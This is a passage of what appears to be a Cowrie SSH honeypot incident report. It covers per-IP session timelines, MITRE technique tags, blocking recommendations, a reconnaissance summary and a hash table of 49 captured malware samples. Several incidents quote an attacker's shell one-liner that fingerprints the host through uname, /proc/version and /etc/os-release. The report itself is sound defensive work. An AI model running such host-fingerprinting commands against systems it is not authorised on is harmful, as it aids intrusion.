- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3035ccb482c

| Field | Detail |
|---|---|
| **Source IP** | `200.232.114[.]71` |
| **First Seen** | 2026-07-08 20:43 |
| **Last Seen** | 2026-07-08 20:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:43:39` | `cowrie.session.connect` |
| `2026-07-08 20:43:39` | `cowrie.client.version` |
| `2026-07-08 20:43:39` | `cowrie.client.kex` |
| `2026-07-08 20:43:41` | `cowrie.login.success` |
| `2026-07-08 20:43:41` | `cowrie.direct-tcpip.request` |
| `2026-07-08 20:43:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.232.114[.]71` to AbuseIPDB if not already reported
- [ ] Block `200.232.114[.]71` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-854fee3d478d

| Field | Detail |
|---|---|
| **Source IP** | `181.177.169[.]88` |
| **First Seen** | 2026-07-08 20:43 |
| **Last Seen** | 2026-07-08 20:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:43:44` | `cowrie.session.connect` |
| `2026-07-08 20:43:44` | `cowrie.client.version` |
| `2026-07-08 20:43:44` | `cowrie.client.kex` |
| `2026-07-08 20:43:46` | `cowrie.login.success` |
| `2026-07-08 20:43:47` | `cowrie.direct-tcpip.request` |
| `2026-07-08 20:43:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.177.169[.]88` to AbuseIPDB if not already reported
- [ ] Block `181.177.169[.]88` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-440f4c8a7edc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:44 |
| **Last Seen** | 2026-07-08 20:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:44:13` | `cowrie.session.connect` |
| `2026-07-08 20:44:13` | `cowrie.client.version` |
| `2026-07-08 20:44:13` | `cowrie.client.kex` |
| `2026-07-08 20:44:14` | `cowrie.login.success` |
| `2026-07-08 20:44:15` | `cowrie.session.params` |
| `2026-07-08 20:44:15` | `cowrie.command.input` |
| `2026-07-08 20:44:15` | `cowrie.command.input` |
| `2026-07-08 20:44:15` | `cowrie.command.input` |
| `2026-07-08 20:44:15` | `cowrie.command.input` |
| `2026-07-08 20:44:15` | `cowrie.command.input` |
| `2026-07-08 20:44:15` | `cowrie.command.success` |
| `2026-07-08 20:44:15` | `cowrie.command.input` |
| `2026-07-08 20:44:15` | `cowrie.command.input` |
| `2026-07-08 20:44:15` | `cowrie.command.input` |
| `2026-07-08 20:44:15` | `cowrie.command.input` |
| `2026-07-08 20:44:15` | `cowrie.log.closed` |
| `2026-07-08 20:44:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7adec94b5efe

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 20:44 |
| **Last Seen** | 2026-07-08 20:44 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:44:24` | `cowrie.session.connect` |
| `2026-07-08 20:44:26` | `cowrie.client.version` |
| `2026-07-08 20:44:26` | `cowrie.client.kex` |
| `2026-07-08 20:44:30` | `cowrie.login.success` |
| `2026-07-08 20:44:34` | `cowrie.session.params` |
| `2026-07-08 20:44:34` | `cowrie.command.input` |
| `2026-07-08 20:44:35` | `cowrie.log.closed` |
| `2026-07-08 20:44:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da534e902ccb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:46 |
| **Last Seen** | 2026-07-08 20:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:46:37` | `cowrie.session.connect` |
| `2026-07-08 20:46:38` | `cowrie.client.version` |
| `2026-07-08 20:46:38` | `cowrie.client.kex` |
| `2026-07-08 20:46:38` | `cowrie.login.success` |
| `2026-07-08 20:46:40` | `cowrie.session.params` |
| `2026-07-08 20:46:40` | `cowrie.command.input` |
| `2026-07-08 20:46:40` | `cowrie.command.input` |
| `2026-07-08 20:46:40` | `cowrie.command.input` |
| `2026-07-08 20:46:40` | `cowrie.command.input` |
| `2026-07-08 20:46:40` | `cowrie.command.input` |
| `2026-07-08 20:46:40` | `cowrie.command.success` |
| `2026-07-08 20:46:40` | `cowrie.command.input` |
| `2026-07-08 20:46:40` | `cowrie.command.input` |
| `2026-07-08 20:46:40` | `cowrie.command.input` |
| `2026-07-08 20:46:40` | `cowrie.command.input` |
| `2026-07-08 20:46:40` | `cowrie.log.closed` |
| `2026-07-08 20:46:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19d77e9aaa32

| Field | Detail |
|---|---|
| **Source IP** | `41.65.118[.]172` |
| **First Seen** | 2026-07-08 20:47 |
| **Last Seen** | 2026-07-08 20:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:47:06` | `cowrie.session.connect` |
| `2026-07-08 20:47:06` | `cowrie.client.version` |
| `2026-07-08 20:47:06` | `cowrie.client.kex` |
| `2026-07-08 20:47:07` | `cowrie.login.success` |
| `2026-07-08 20:47:08` | `cowrie.direct-tcpip.request` |
| `2026-07-08 20:47:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.65.118[.]172` to AbuseIPDB if not already reported
- [ ] Block `41.65.118[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34076cb94f54

| Field | Detail |
|---|---|
| **Source IP** | `61.145.181[.]7` |
| **First Seen** | 2026-07-08 20:47 |
| **Last Seen** | 2026-07-08 20:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:47:17` | `cowrie.session.connect` |
| `2026-07-08 20:47:18` | `cowrie.client.version` |
| `2026-07-08 20:47:18` | `cowrie.client.kex` |
| `2026-07-08 20:47:20` | `cowrie.login.success` |
| `2026-07-08 20:47:21` | `cowrie.direct-tcpip.request` |
| `2026-07-08 20:47:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.145.181[.]7` to AbuseIPDB if not already reported
- [ ] Block `61.145.181[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64525b7a52c2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:48 |
| **Last Seen** | 2026-07-08 20:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:48:58` | `cowrie.session.connect` |
| `2026-07-08 20:48:59` | `cowrie.client.version` |
| `2026-07-08 20:48:59` | `cowrie.client.kex` |
| `2026-07-08 20:49:00` | `cowrie.login.success` |
| `2026-07-08 20:49:01` | `cowrie.session.params` |
| `2026-07-08 20:49:01` | `cowrie.command.input` |
| `2026-07-08 20:49:01` | `cowrie.command.input` |
| `2026-07-08 20:49:01` | `cowrie.command.input` |
| `2026-07-08 20:49:01` | `cowrie.command.input` |
| `2026-07-08 20:49:01` | `cowrie.command.input` |
| `2026-07-08 20:49:01` | `cowrie.command.success` |
| `2026-07-08 20:49:01` | `cowrie.command.input` |
| `2026-07-08 20:49:01` | `cowrie.command.input` |
| `2026-07-08 20:49:01` | `cowrie.command.input` |
| `2026-07-08 20:49:01` | `cowrie.command.input` |
| `2026-07-08 20:49:02` | `cowrie.log.closed` |
| `2026-07-08 20:49:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a1507d6dfb6

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-08 20:49 |
| **Last Seen** | 2026-07-08 20:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:49:20` | `cowrie.session.connect` |
| `2026-07-08 20:49:20` | `cowrie.client.version` |
| `2026-07-08 20:49:20` | `cowrie.client.kex` |
| `2026-07-08 20:49:20` | `cowrie.login.success` |
| `2026-07-08 20:49:21` | `cowrie.session.params` |
| `2026-07-08 20:49:21` | `cowrie.command.input` |
| `2026-07-08 20:49:21` | `cowrie.log.closed` |
| `2026-07-08 20:49:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6ff50c77c70

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:51 |
| **Last Seen** | 2026-07-08 20:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:51:19` | `cowrie.session.connect` |
| `2026-07-08 20:51:19` | `cowrie.client.version` |
| `2026-07-08 20:51:19` | `cowrie.client.kex` |
| `2026-07-08 20:51:20` | `cowrie.login.success` |
| `2026-07-08 20:51:21` | `cowrie.session.params` |
| `2026-07-08 20:51:21` | `cowrie.command.input` |
| `2026-07-08 20:51:21` | `cowrie.command.input` |
| `2026-07-08 20:51:21` | `cowrie.command.input` |
| `2026-07-08 20:51:21` | `cowrie.command.input` |
| `2026-07-08 20:51:21` | `cowrie.command.input` |
| `2026-07-08 20:51:21` | `cowrie.command.success` |
| `2026-07-08 20:51:21` | `cowrie.command.input` |
| `2026-07-08 20:51:21` | `cowrie.command.input` |
| `2026-07-08 20:51:21` | `cowrie.command.input` |
| `2026-07-08 20:51:21` | `cowrie.command.input` |
| `2026-07-08 20:51:22` | `cowrie.log.closed` |
| `2026-07-08 20:51:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-858aead29b51

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:53 |
| **Last Seen** | 2026-07-08 20:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:53:41` | `cowrie.session.connect` |
| `2026-07-08 20:53:42` | `cowrie.client.version` |
| `2026-07-08 20:53:42` | `cowrie.client.kex` |
| `2026-07-08 20:53:43` | `cowrie.login.success` |
| `2026-07-08 20:53:43` | `cowrie.session.params` |
| `2026-07-08 20:53:43` | `cowrie.command.input` |
| `2026-07-08 20:53:43` | `cowrie.command.input` |
| `2026-07-08 20:53:43` | `cowrie.command.input` |
| `2026-07-08 20:53:43` | `cowrie.command.input` |
| `2026-07-08 20:53:43` | `cowrie.command.input` |
| `2026-07-08 20:53:43` | `cowrie.command.success` |
| `2026-07-08 20:53:43` | `cowrie.command.input` |
| `2026-07-08 20:53:43` | `cowrie.command.input` |
| `2026-07-08 20:53:43` | `cowrie.command.input` |
| `2026-07-08 20:53:43` | `cowrie.command.input` |
| `2026-07-08 20:53:44` | `cowrie.log.closed` |
| `2026-07-08 20:53:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `179.61.192[.]156` | **50** | 2026-07-08 18:56 | 2026-07-08 20:54 | 55m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-07-08 19:00 | 2026-07-08 20:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `164.92.115[.]22` | **4** | 2026-07-08 19:42 | 2026-07-08 20:07 | 2m | 0 | `T1592` | 🟢 LOW |
| `182.72.90[.]110` | **3** | 2026-07-08 20:42 | 2026-07-08 20:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.12.108[.]64` | **2** | 2026-07-08 19:16 | 2026-07-08 19:18 | 4m | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | **2** | 2026-07-08 19:15 | 2026-07-08 20:31 | 1m | 0 | `T1592` | 🟢 LOW |
| `20.15.200[.]100` | **2** | 2026-07-08 19:27 | 2026-07-08 19:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.84.145[.]58` | **2** | 2026-07-08 20:42 | 2026-07-08 20:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]49` | **2** | 2026-07-08 19:09 | 2026-07-08 19:43 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `139.19.117[.]129` | 1 | 2026-07-08 20:14 | 2026-07-08 20:14 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `174.64.199[.]85` | 1 | 2026-07-08 20:12 | 2026-07-08 20:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.148[.]171` | 1 | 2026-07-08 19:37 | 2026-07-08 19:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `206.81.2[.]201` | 1 | 2026-07-08 19:41 | 2026-07-08 19:41 | 38s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-07-08 19:04 | 2026-07-08 19:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.198.224[.]120` | 1 | 2026-07-08 19:08 | 2026-07-08 19:09 | 12s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]129` | 1 | 2026-07-08 19:35 | 2026-07-08 19:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]2` | 1 | 2026-07-08 18:55 | 2026-07-08 18:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | 1 | 2026-07-08 20:00 | 2026-07-08 20:01 | 61s | 0 | `T1592` | 🟢 LOW |
| `58.223.165[.]154` | 1 | 2026-07-08 19:23 | 2026-07-08 19:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `61.218.132[.]28` | 1 | 2026-07-08 20:51 | 2026-07-08 20:51 | 13s | 0 | `T1592` | 🟢 LOW |
| `63.135.169[.]175` | 1 | 2026-07-08 20:43 | 2026-07-08 20:43 | 1s | 0 | `T1592` | 🟢 LOW |
| `83.191.176[.]93` | 1 | 2026-07-08 20:41 | 2026-07-08 20:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `86.217.146[.]241` | 1 | 2026-07-08 20:10 | 2026-07-08 20:10 | 13s | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]90` | 1 | 2026-07-08 20:32 | 2026-07-08 20:32 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 57/100 | 🟡 MEDIUM | **18/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/73 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/73** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 67/100 | 🟡 MEDIUM | **18/73** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **32/73** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/73** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/73** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/73** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 43/100 | 🟡 MEDIUM | **34/73** 🔴 |
